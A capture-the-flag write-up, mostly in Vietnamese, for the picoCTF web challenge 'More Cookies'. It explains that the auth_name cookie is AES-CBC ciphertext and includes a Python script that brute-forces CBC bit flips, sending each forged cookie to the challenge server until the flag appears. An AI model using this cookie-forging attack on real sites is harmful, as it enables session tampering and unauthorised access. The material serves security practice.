More Cookies
===
**Category:** Web

**Author:** MADSTACKS

### Description
I forgot Cookies can Be modified Client-side, so now I decided to encrypt them!

### Overview
- Đầu tiên vào trang web thì chúng thấy không có chỗ nào để input. Như tên của challange có nhắc đến cookie vì vậy mình kiểm tra cookie thì thấy có một cookie `auth_name` và value của nó như một chuỗi base64

### Solution
- Sau khi mình nhận value của `auth_name` như base64 thì mình đã mang chuỗi đó đi decode thì kết quả nhận được một chuỗi base64 khác và tiếp tục decode thì nhận được một chuỗi khá lộn xộn như được encrypt bằng thuật toán nào đó.
- Đến đây khá là stuck thì đã được người bạn cho hint về thuật toán nó encrypt là `bit flipping` và sau đó thì mình tìm hiểu và được sư phụ của mình giải thích :) thì biết rằng cookie được mã hóa theo kiểu `auth_name:base64_encode(AES_CBC(plaintext))` vì vậy chuỗi cookie ban đầu nó được base64_encode 2 lần vì trong lúc encrypt của AES nó cũng đã base64 data rồi.
- Tìm được đoạn code của bit flipping để encrypt bằng python và sau đó mình đã xor từng kí tự của nó trên chuỗi base64

##### Payload
```py
import base64
from binascii import unhexlify
import time
import requests

decoded_cookie = "SGoycDRnV3ZkbWFUaitKMDcydzh5OHVxYStyWGpsV2RXZHZiUFMySXEyRHl3S3MzM0N1Q0NLT1I5TElOQ2xFbVYrd2FJeWdFOGpTVFJEUklBMlJOeFlzc3VvajRadHFudFAyd0NUY1BjNGFGSjN3OTVGTlYzRVIvQVczNVdyT08="


def bitFlip( pos, bit, data):
    raw = base64.b64decode(data)

    list1 = list(raw)
    list1[pos] = chr(ord(list1[pos])^bit)
    raw = ''.join(list1)
    return base64.b64encode(raw)

for pos in range(128):
  print(pos)
  for bit in range(128):
    cookie_value = bitFlip(pos, bit, decoded_cookie)
    # print(cookie_value)
    cookies = {'auth_name': cookie_value}
    r = requests.get('http://mercury.picoctf.net:15614/', cookies=cookies)
    if "picoCTF{" in r.text:
      print(r.text)
      print(cookie_value)
      exit()
```
- Payload này được viết bằng python3 nhưng hàm `bitFlip` được lấy từ SOF thì là python2 nên vì vậy hãy sử dụng python2 để chạy